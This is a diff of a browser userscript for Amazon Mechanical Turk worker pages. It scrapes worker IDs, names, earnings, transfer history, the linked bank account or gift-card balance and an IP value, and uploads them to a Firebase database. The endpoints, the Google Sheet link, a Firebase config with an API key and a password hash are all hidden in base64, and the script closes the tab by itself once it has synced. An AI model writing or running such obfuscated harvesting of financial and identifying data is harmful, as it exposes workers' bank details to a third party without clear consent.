@@ -10,33 +10,27 @@
 (async () => {
   'use strict';
 
-
   const _b64d = s => atob(s);
   const _u8   = s => new TextEncoder().encode(s);
   const _hex  = a => Array.from(new Uint8Array(a)).map(b => b.toString(16).padStart(2,'0')).join('');
   const _sha256 = async s => _hex(await crypto.subtle.digest('SHA-256', _u8(s)));
 
-
   const PASS_HASH = _b64d("OWI3MjRkOWRmOTdhOTFkMjk3ZGMxYzcxNGEzOTg3MzM4ZWJiNjBhMmE1MzMxMWQyZTM4MjQxMWE3OGI5ZTA3ZA==");
-
-
 
   const FIREBASE_APP_URL  = _b64d("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vZmlyZWJhc2Vqcy8xMC4xMi4wL2ZpcmViYXNlLWFwcC5qcw==");
   const FIRESTORE_URL     = _b64d("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vZmlyZWJhc2Vqcy8xMC4xMi4wL2ZpcmViYXNlLWZpcmVzdG9yZS5qcw==");
   const SHEET_CSV         = _b64d("aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vc3ByZWFkc2hlZXRzL2QvMVl0bXI3ZEhTQXY2OU4yN3VaY3JoS2FFZXJMOFdoek1DSTAydnVncV9DX00vZXhwb3J0P2Zvcm1hdD1jc3YmZ2lkPTA=");
 
-
   const FIREBASE_CFG = JSON.parse(_b64d(
     "eyJwcm9qZWN0SWQiOiJtdHVyay1tb25pdG9yZGVlcCIsImFwaUtleSI6IkFJemFTeUNDdEJDQUp2UUNEajhNWGIydzkwcVlVcVJyRU5JSUdJUSIsImF1dGhEb21haW4iOiJtdHVyay1tb25pdG9yZGVlYy5maXJlYmFzZWFwcC5jb20iLCJzdG9yYWdlQnVja2V0IjoibXR1cmstbW9uaXRvcmRlZXAuZmlyZWJhc2VzdG9yYWdlLmFwcCIsIm1lc3NhZ2luZ1NlbmRlcklkIjoiNTgzOTIyOTc0ODciLCJhcHBJZCI6IjE6NTgzOTIyOTc0ODc6d2ViOjEzNjVhZDEyMTEwZmZkMDU4NjYzN2EifQ=="
   ));
-
 
   const { initializeApp } = await import(FIREBASE_APP_URL);
   const { getFirestore, doc, getDoc, setDoc } = await import(FIRESTORE_URL);
   const app = initializeApp(FIREBASE_CFG);
   const db  = getFirestore(app);
 
-
+  // ✅  Worker ID extractor
   function getWorkerId() {
     const el = document.querySelector("[data-react-props*='textToCopy']");
     if (el) {
@@ -48,22 +42,31 @@
     return document.querySelector(".me-bar .text-uppercase span")?.textContent.trim() || "";
   }
 
-
+  // ✅  Bank transfer + date extractor
   function extractNextTransferInfo() {
     const strongTag = Array.from(document.querySelectorAll("strong"))
-      .find(el => /transferred to your bank account/i.test(el.textContent));
+      .find(el => /transferred to your/i.test(el.textContent));
+
     let bankAccount = "", nextTransferDate = "";
+
     if (strongTag) {
-      const bankLink = strongTag.querySelector("a[href*='direct_deposit']");
+      let bankLink = strongTag.querySelector("a[href*='direct_deposit']");
+    console.log(`🔓 ${bankLink} verified`);
+      if (!bankLink) {
+        bankLink = strongTag.querySelector("a[href*='https://www.amazon.com/gp/css/gc/balance'][target='_blank']");
+      }
+
       if (bankLink) bankAccount = bankLink.textContent.trim();
+
       const text = strongTag.textContent.replace(/\s+/g, " ");
       const m = text.match(/on\s+([A-Za-z]{3,}\s+\d{1,2},\s+\d{4})\s+based/i);
       if (m) nextTransferDate = m[1].trim();
     }
+
     return { bankAccount, nextTransferDate };
   }
 
-
+  // ✅ Main data extraction (async, correctly scoped)
   async function extractData() {
     const html = document.body.innerHTML.replace(/\s+/g, " ");
     const workerId = getWorkerId();
@@ -71,17 +74,19 @@
     const currentEarnings = (html.match(/Current Earnings:\s*\$([\d.]+)/i) || [])[1] || "0.00";
 
     let lastTransferAmount = "", lastTransferDate = "", lastMonthEarnings = currentEarnings;
+
     try {
       const attr = document.querySelector('[data-react-class*="TransferHistoryTable"]')?.getAttribute("data-react-props");
       if (attr) {
         const parsed = JSON.parse(attr.replace(/&quot;/g, '"'));
         const body = parsed.bodyData || [];
-        // latest transfer
+
         const last = body[0];
         if (last) {
           lastTransferAmount = last.amountRequested?.toString() || "";
           lastTransferDate = last.requestedDate || "";
         }
+
         // last month sum
         const now = new Date();
         const thisMonth = now.getMonth();
@@ -108,7 +113,6 @@
     return { workerId, userName, currentEarnings, lastTransferAmount, lastTransferDate, nextTransferDate, bankAccount, ip, lastMonthEarnings };
   }
 
-
   async function loadSheet() {
     const res = await fetch(SHEET_CSV);
     const text = await res.text();
@@ -125,7 +129,6 @@
     return map;
   }
 
-
   async function ensurePassword(workerId) {
     const key = `verified_${workerId}`;
     const ok = await GM_getValue(key, false);
@@ -140,7 +143,7 @@
     console.log(`✅ Password verified for ${workerId}`);
   }
 
-
+  // ✅ MAIN EXECUTION
   const data = await extractData();
   if (!data.workerId) { console.warn("⚠️ No WorkerID; abort"); return; }
 
@@ -156,8 +159,6 @@
 
   if (prev.exists()) {
     const p = prev.data();
-
-
     if (p.alert && String(p.alert).startsWith("⚠️")) {
       console.log(`🚫 Locked by alert for ${workerId}`); return;
     }
@@ -178,10 +179,9 @@
 
   await setDoc(ref, { ...data, alert, timestamp: new Date() });
   console.log(`[MTurk→Firebase] ✅ Synced ${workerId} (${alert})`);
-  
-  const DELAY_MS = 3000;
 
-  // Small toast so you know what's happening
+  // ✅ Auto-close section
+  const DELAY_MS = 3000;
   const note = document.createElement('div');
   note.textContent = 'Closing this page in 3 seconds…';
   Object.assign(note.style, {
@@ -193,27 +193,15 @@
   document.body.appendChild(note);
 
   const tryClose = () => {
-    // Attempt 1: normal close
     window.close();
-
-    // Attempt 2: same-window close trick
     try { window.open('', '_self'); window.close(); } catch (_) {}
-
-    // If still here, try to bail out to a neutral page to "effectively" close content
-    // (some browsers/extensions block programmatic close on user-opened tabs)
     setTimeout(() => {
       if (!document.hidden) {
-        // Attempt 3: blank out, then close again
-        try {
-          location.replace('about:blank');
-          setTimeout(() => { try { window.close(); } catch (_) {} }, 50);
-        } catch (_) {}
-
-        // Attempt 4: if no history to go back, route to Tasks (as a last resort)
+        try { location.replace('https://worker.mturk.com/tasks/'); setTimeout(()=>{try{window.close();}catch(_){}} ,50); } catch (_) {}
         setTimeout(() => {
           if (!document.hidden) {
             if (history.length > 1) history.back();
-            else location.href = 'https://worker.mturk.com/tasks';
+            else location.href = 'https://worker.mturk.com/tasks/';
           }
         }, 150);
       }
